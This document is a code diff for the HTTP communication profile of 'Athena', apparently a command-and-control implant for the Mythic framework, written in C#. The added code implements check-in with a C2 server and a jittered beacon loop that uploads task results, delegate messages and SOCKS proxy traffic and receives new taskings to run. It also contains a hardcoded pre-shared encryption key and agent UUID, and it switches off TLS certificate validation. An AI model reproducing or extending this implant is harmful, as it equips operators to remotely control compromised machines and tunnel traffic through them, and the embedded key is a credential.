@@ -1,47 +1,47 @@
-﻿using Athena.Models.Config;
+﻿using Athena.Commands;
+using Athena.Models.Athena.Commands;
+using Athena.Models.Config;
+using Athena.Models.Mythic.Checkin;
+using Athena.Models.Mythic.Response;
+using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
-using System.Text.Json;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
 using System.Net;
 using System.Net.Security;
-using System.Diagnostics;
+using System.Text;
+using System.Text.Json;
+using System.Text.Json.Serialization;
+using System.Threading.Tasks;
 
-namespace Athena
+namespace Athena.Profiles.HTTP
 {
-    public class Config : IConfig
-    {
-        public IProfile profile { get; set; }
-        public DateTime killDate { get; set; }
-        public int sleep { get; set; }
-        public int jitter { get; set; }
-
-        public Config()
-        {
-            DateTime kd = DateTime.TryParse("2024-03-05", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
-            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("23", out jitter) ? jitter : 10;
-            this.jitter = jitter;
-            this.profile = new HTTP();
-        }
-    }
-    public class HTTP : IProfile
+    public class HTTPNew : IProfile
     {
         public string uuid { get; set; }
-        public string userAgent { get; set; }
-        public string hostHeader { get; set; }
-        public string getURL { get; set; }
-        public string postURL { get; set; }
+        private string userAgent { get; set; }
+        private string hostHeader { get; set; }
+        private string getURL { get; set; }
+        private string postURL { get; set; }
         public string psk { get; set; }
-        public bool encryptedExchangeCheck { get; set; }
-        public string proxyHost { get; set; }
-        public string proxyPass { get; set; }
-        public string proxyUser { get; set; }
-        public PSKCrypto crypt { get; set; }
+        private string proxyHost { get; set; }
+        private string proxyPass { get; set; }
+        private string proxyUser { get; set; }
+        private bool encryptedExchangeCheck { get; set; }
         public bool encrypted { get; set; }
+        private int maxAttempts = 5;
+        private int currentAttempt { get; set; }
+        public int sleep { get; set; }
+        public int jitter { get; set; }
+        public PSKCrypto crypt { get; set; }
         private HttpClient client { get; set; }
+        private DateTime killDate { get; set; }
+        private CancellationTokenSource cts = new CancellationTokenSource();
+        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
 
-        public HTTP()
+        public HTTPNew()
         {
             HttpClientHandler handler = new HttpClientHandler();
             int callbackPort = Int32.Parse("80");
@@ -58,7 +58,12 @@ namespace Athena
             this.proxyUser = "";
             this.psk = "qPoh3l1U0rxnF9tHYpSL8LnhRmfVqTUNh6NkebHFMLw=";
             this.uuid = "56e59d4e-674c-41b1-ad88-c22bdcb108b7";
-
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
+            int sleep = int.TryParse("10", out sleep) ? sleep : 60;
+            this.sleep = sleep;
+            int jitter = int.TryParse("23", out jitter) ? jitter : 10;
+            this.jitter = jitter;
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
                    new RemoteCertificateValidationCallback(
@@ -101,15 +106,93 @@ namespace Athena
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
-
-
-
         }
-        public async Task<string> Send(string json)
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        {
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
+        }
+        public async Task StartBeacon()
+        {
+            //Main beacon loop handled here
+            while (!cts.Token.IsCancellationRequested)
+            {
+                await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
+                Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
+                Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
+                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask);
+
+                List<string> responses = await responseTask;
+
+                GetTasking gt = new GetTasking()
+                {
+                    action = "get_tasking",
+                    tasking_size = -1,
+                    delegates = await delegateTask,
+                    socks = await socksTask,
+                    responses = responses,
+                };
+                try
+                {
+                    string responseString = await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
+
+                    if (String.IsNullOrEmpty(responseString))
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                    if (gtr == null)
+                    {
+                        this.currentAttempt++;
+                        continue;
+                    }
+
+                    this.currentAttempt = 0;
+
+                    TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
+
+                    this.SetTaskingReceived(this, tra);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
+                    this.currentAttempt++;
+                }
+
+                if (this.currentAttempt >= this.maxAttempts)
+                {
+                    this.cts.Cancel();
+                }
+            }
+        }
+        public async Task<bool> StopBeacon()
+        {
+            cts.Cancel();
+            return true;
+        }
+        internal async Task<string> Send(string json)
         {
             try
             {
-                Debug.WriteLine($"[{DateTime.Now}] Athena -> Mythic: {json}");
+                Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -138,23 +221,23 @@ namespace Athena
 
                 if (this.encrypted)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Mythic -> Athena: {this.crypt.Decrypt(strRes)}");
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
                     return this.crypt.Decrypt(strRes);
                 }
 
                 if (!string.IsNullOrEmpty(strRes))
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Mythic -> Athena: {Misc.Base64Decode(strRes).Result.Substring(36)}");
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
                     return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
 
                 return String.Empty;
             }
-            catch (Exception e)
+            catch
             {
-                Debug.WriteLine($"[{DateTime.Now}] Exception in send: {e.ToString()}");
                 return String.Empty;
             }
         }
     }
+
 }
